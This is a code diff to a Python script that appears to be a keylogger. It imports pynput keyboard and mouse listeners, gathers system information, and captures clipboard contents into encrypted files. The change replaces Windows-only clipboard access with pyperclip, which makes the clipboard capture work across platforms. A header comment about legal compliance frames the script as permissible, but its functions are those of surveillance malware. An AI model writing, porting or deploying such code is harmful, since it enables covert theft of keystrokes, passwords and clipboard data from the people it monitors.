@@ -4,14 +4,12 @@
 # and that its operation complies with all relevant laws and regulations.
 
 
-
-
 # Standard library imports for network communication and system-level operations.
 import socket  # Provides access to the BSD socket interface for networking.
 import platform  # Access to underlying platform’s identifying data.
 
-# Third-party import for interacting with the Windows clipboard.
-import win32clipboard  # Allows Python code to access the Windows clipboard.
+# Third-party import for interacting with the clipboard.
+import pyperclip # Allows Python code to access the clipboard.
 
 # Imports from the pynput library to capture keyboard and mouse events.
 from pynput.keyboard import Listener as KeyListener  # Listener for keyboard events.
@@ -129,9 +127,7 @@ def gather_system_information(file_name, key):
 def log_clipboard(file_name, key):
     try:
         with open(file_name, "w") as f:
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
+            pasted_data = pyperclip.paste()
             f.write("Clipboard Data: \n" + pasted_data)
         encrypt_file(file_name, key)
     except Exception as e:
